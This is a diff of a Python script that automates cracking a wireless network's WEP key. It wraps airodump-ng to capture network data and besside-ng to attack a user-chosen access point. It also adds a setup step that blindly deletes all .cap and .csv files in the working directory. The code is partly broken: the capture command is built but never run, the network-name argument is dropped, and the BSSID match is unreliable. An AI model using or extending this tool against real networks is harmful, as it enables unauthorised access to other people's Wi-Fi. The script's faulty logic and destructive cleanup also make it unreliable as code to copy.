@@ -2,6 +2,10 @@ import os
 import subprocess
 import sys
 
+def normalSetup():
+    os.system("rm *.cap")
+    os.system("rm *.csv")
+
 def setupNetworkReader(interface_name):
     print("setting up network card")
     try:
@@ -16,25 +20,32 @@ def setupNetworkReader(interface_name):
 def getBSSIDInfo(essid, interface_name):
     print("press CTRL+C after your network pops up. we'll strip out the BSSID for you.\nIf your network doesn't pop up, we probably can't find it.")
     try: 
-        cmd = "airodump-ng {} --essid {} -w allnet2".format(interface_name, essid)
+        cmd = "airodump-ng {} -w allnet2".format(interface_name, essid)
     except KeyboardInterrupt:
-		print("obtained BSSID info")
+        print("obtained BSSID info")
 
-def crackWEP(bssid, essid):
-    print("cracking wep")
-    # open up csv file with bssid in it, split by newline and then split by
-    # run besside-ng
+def crackWEP(essid, interface):
+    print("parsing bssid")
+    bssid = ""
+    with open("allnet2.csv") as f:
+        for line in f.readlines():
+            arr = line.split(",")
+            print(arr)
+            if arr[len(arr) - 1] == essid:
+                bssid = arr[0]
+                print(bssid)
+                break
 
-def connectToNetwork():
-    print("connecting to network")
-    # close airmon stuff
-    # start wireless card again
-    #   
+    runBesside(bssid, interface)
+
+def runBesside(bssid, interface):
+    print("cracking WEP. in a separate terminal please run sudo python3 crack.py")
+    os.system("besside-ng {} -b {}".format(interface, bssid))
 
 if __name__ == "__main__":
+    normalSetup()
     interface = input("Please enter the interface name of your wireless network reader. You can find this by running ifconfig. It should be a wlan: ")
     monitorModeInterface = setupNetworkReader(interface)
     essid = input("Enter the ESSID (network name) of the access point you are trying to crack: ")
     getBSSIDInfo(essid, monitorModeInterface)
-    
-    print(bssid)
+    crackWEP(essid, monitorModeInterface)
